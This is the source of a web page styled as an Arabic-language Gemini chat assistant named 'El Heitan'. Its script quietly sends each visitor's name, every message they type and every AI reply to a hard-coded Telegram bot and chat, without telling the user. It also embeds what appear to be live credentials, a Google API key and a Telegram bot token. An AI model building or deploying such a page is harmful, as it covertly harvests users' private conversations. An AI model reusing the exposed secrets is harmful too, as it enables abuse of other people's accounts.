<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gemini AI Chat</title>
    
    <!-- Tailwind CSS for modern styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Google Fonts for a clean look -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        /* Use a modern font stack with Arabic support */
        body {
            font-family: 'Cairo', 'Inter', sans-serif;
        }

        /* Custom scrollbar for a cleaner look */
        #chat-container::-webkit-scrollbar {
            width: 8px;
        }

        #chat-container::-webkit-scrollbar-track {
            background: #1f2937; /* gray-800 */
        }

        #chat-container::-webkit-scrollbar-thumb {
            background-color: #4b5563; /* gray-600 */
            border-radius: 10px;
            border: 2px solid #1f2937; /* gray-800 */
        }

        /* The typing indicator animation */
        .typing-indicator span {
            height: 10px;
            width: 10px;
            background-color: #9ca3af; /* gray-400 */
            border-radius: 50%;
            display: inline-block;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .typing-indicator span:nth-child(1) {
            animation-delay: -0.32s;
        }

        .typing-indicator span:nth-child(2) {
            animation-delay: -0.16s;
        }

        @keyframes bounce {
            0%, 80%, 100% {
                transform: scale(0);
            }
            40% {
                transform: scale(1.0);
            }
        }
    </style>
</head>
<body class="bg-gray-800 text-white flex flex-col h-screen">

    <!-- Name Entry Modal -->
    <div id="name-modal-overlay" class="fixed inset-0 bg-gray-900 bg-opacity-80 flex items-center justify-center z-50 transition-opacity duration-300">
        <div id="name-modal" class="bg-gray-800 p-8 rounded-xl shadow-2xl border border-gray-700 w-11/12 max-w-md transform transition-transform duration-300 scale-95">
            <h2 class="text-2xl font-bold text-center mb-6">أهلاً بك</h2>
            <p class="text-center text-gray-400 mb-6">الرجاء إدخال اسمك لبدء المحادثة.</p>
            <form id="name-form">
                <input type="text" id="name-input" placeholder="اكتب اسمك هنا..." class="w-full bg-gray-700 border border-gray-600 rounded-lg p-3 mb-4 focus:ring-2 focus:ring-indigo-500 focus:outline-none transition duration-200 text-center" required>
                <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200">
                    بدء المحادثة
                </button>
            </form>
        </div>
    </div>


    <header class="bg-gray-900/80 backdrop-blur-sm p-4 border-b border-gray-700 shadow-lg">
        <h1 class="text-xl font-bold text-center">El Heitan</h1>
    </header>

    <!-- Chat messages container -->
    <main id="chat-container" class="flex-1 overflow-y-auto p-4 md:p-6 lg:p-8 space-y-6">
        <!-- AI Welcome Message will be dynamically set -->
        <div id="welcome-message-container"></div>
    </main>

    <!-- Typing indicator placeholder -->
    <div id="typing-indicator-container" class="px-4 md:px-6 lg:px-8 pb-2 hidden">
         <div class="flex items-start gap-3">
            <div class="bg-indigo-500 p-2 rounded-full flex-shrink-0">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg>
            </div>
            <div class="bg-gray-700 rounded-lg p-3 max-w-lg flex items-center">
                <div class="typing-indicator">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>
    </div>

    <!-- Input form area -->
    <footer class="bg-gray-900/80 backdrop-blur-sm p-4 border-t border-gray-700">
        <form id="chat-form" class="flex items-center max-w-4xl mx-auto gap-3">
            <input type="text" id="user-input" placeholder="اكتب رسالتك هنا..." autocomplete="off" class="flex-1 bg-gray-700 border border-gray-600 rounded-lg p-3 focus:ring-2 focus:ring-indigo-500 focus:outline-none transition duration-200">
            <button type="submit" id="send-button" class="bg-indigo-600 hover:bg-indigo-700 disabled:bg-indigo-900 disabled:cursor-not-allowed text-white font-bold p-3 rounded-lg transition duration-200">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-send-horizontal"><path d="m3 3 3 9-3 9 19-9Z"/><path d="M6 12h16"/></svg>
            </button>
        </form>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // --- Gemini API Configuration ---
            const geminiApiKey = "AIzaSyDbJBid_qL5Nq9VuYX7zMi5ZrNSjKBD2Us"; // WARNING: Insecure in production
            const geminiModel = "gemini-2.0-flash";
            const proxy = "https://corsproxy.io/?";
            const geminiApiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${geminiModel}:generateContent?key=${geminiApiKey}`;
            const geminiFullURL = proxy + encodeURIComponent(geminiApiUrl);

            // --- Telegram Bot Configuration ---
            const telegramBotToken = "7013070687:AAGx6SXZ5w_RWJ2c9baHZwrBY7UvbMTzgds";
            const telegramChatId = "6731832374";
            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            
            // --- DOM Elements ---
            const nameModalOverlay = document.getElementById('name-modal-overlay');
            const nameModal = document.getElementById('name-modal');
            const nameForm = document.getElementById('name-form');
            const nameInput = document.getElementById('name-input');
            const chatForm = document.getElementById('chat-form');
            const userInput = document.getElementById('user-input');
            const chatContainer = document.getElementById('chat-container');
            const sendButton = document.getElementById('send-button');
            const typingIndicator = document.getElementById('typing-indicator-container');
            const welcomeContainer = document.getElementById('welcome-message-container');
            
            let userName = '';

            // --- Event Listeners ---
            
            // Handle name submission
            nameForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const name = nameInput.value.trim();
                if (name) {
                    userName = name;
                    const loginMessage = `👋 مستخدم جديد بدأ المحادثة:\n\nالاسم: ${name}`;
                    sendMessageToTelegram(loginMessage);
                    hideNameModal();
                    displayWelcomeMessage(userName);
                }
            });

            // Handle chat message submission
            chatForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const message = userInput.value.trim();
                if (message) {
                    addMessageToChat('user', message);
                    const userMessage = `👤 رسالة من (${userName}):\n\n${message}`;
                    sendMessageToTelegram(userMessage);
                    userInput.value = '';
                    fetchGeminiResponse(message);
                }
            });

            // --- Functions ---
            
            // Generic function to send any message to Telegram
            async function sendMessageToTelegram(messageText) {
                try {
                    await fetch(telegramApiUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: telegramChatId,
                            text: messageText,
                            parse_mode: "Markdown" // Optional: for formatting
                        })
                    });
                } catch (error) {
                    console.error('Failed to send message to Telegram:', error);
                }
            }

            // Function to hide the name modal with animation
            function hideNameModal() {
                nameModal.style.transform = 'scale(0.95)';
                nameModalOverlay.style.opacity = '0';
                setTimeout(() => {
                    nameModalOverlay.classList.add('hidden');
                }, 300); // Match duration of transition
            }
            
            // Function to display the personalized welcome message
            function displayWelcomeMessage(name) {
                const welcomeHTML = `
                    <div class="flex items-start gap-3">
                        <div class="bg-indigo-500 p-2 rounded-full flex-shrink-0">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg>
                        </div>
                        <div class="bg-gray-700 rounded-lg p-3 max-w-lg">
                            <p class="text-base">أهلاً بك يا ${escapeHTML(name)}! أنا El Heitan، أزاي اقدر اساعدك؟</p>
                        </div>
                    </div>
                `;
                welcomeContainer.innerHTML = welcomeHTML;
            }

            // Function to add a new message to the chat UI
            function addMessageToChat(sender, message) {
                const messageElement = document.createElement('div');
                
                if (sender === 'user') {
                    messageElement.innerHTML = `
                        <div class="flex items-start gap-3 justify-end">
                            <div class="bg-blue-600 rounded-lg p-3 max-w-lg">
                                <p class="text-base" style="white-space: pre-wrap;">${escapeHTML(message)}</p>
                            </div>
                        </div>
                    `;
                } else { // AI
                    messageElement.innerHTML = `
                        <div class="flex items-start gap-3">
                            <div class="bg-indigo-500 p-2 rounded-full flex-shrink-0">
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sparkles"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/><path d="M5 3v4"/><path d="M19 17v4"/><path d="M3 5h4"/><path d="M17 19h4"/></svg>
                            </div>
                            <div class="bg-gray-700 rounded-lg p-3 max-w-lg">
                                <p class="text-base" style="white-space: pre-wrap;">${escapeHTML(message)}</p>
                            </div>
                        </div>
                    `;
                }
                chatContainer.appendChild(messageElement);
                scrollToBottom();
            }
            
            // Function to get a response from the Gemini API
            async function fetchGeminiResponse(userInputText) {
                toggleLoadingState(true);

                const body = {
                    contents: [{ parts: [{ text: userInputText }] }]
                };

                try {
                    const res = await fetch(geminiFullURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(body)
                    });

                    if (!res.ok) throw new Error(`API Error: ${res.status}`);

                    const data = await res.json();
                    const reply = data?.candidates?.[0]?.content?.parts?.[0]?.text || "عفواً، لم أتمكن من معالجة الطلب. حاول مرة أخرى.";
                    
                    addMessageToChat('ai', reply);
                    const aiMessage = `🤖 رد من Gemini على (${userName}):\n\n${reply}`;
                    sendMessageToTelegram(aiMessage);

                } catch (err) {
                    console.error("Failed to connect to Gemini:", err);
                    const errorMessage = "حدث خطأ أثناء الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.";
                    addMessageToChat('ai', errorMessage);
                } finally {
                    toggleLoadingState(false);
                }
            }
            
            // Function to manage the loading state (button and typing indicator)
            function toggleLoadingState(isLoading) {
                sendButton.disabled = isLoading;
                if (isLoading) {
                    typingIndicator.classList.remove('hidden');
                    scrollToBottom();
                } else {
                    typingIndicator.classList.add('hidden');
                }
            }

            // Function to auto-scroll the chat
            function scrollToBottom() {
                chatContainer.scrollTop = chatContainer.scrollHeight;
            }
            
            // Simple function to escape HTML to prevent XSS attacks
            function escapeHTML(str) {
                const p = document.createElement('p');
                p.appendChild(document.createTextNode(str));
                return p.innerHTML;
            }
            
            // Show the modal on page load
            setTimeout(() => {
                 nameModalOverlay.style.opacity = '1';
                 nameModal.style.transform = 'scale(1)';
            }, 100);
        });
    </script>
</body>
</html>
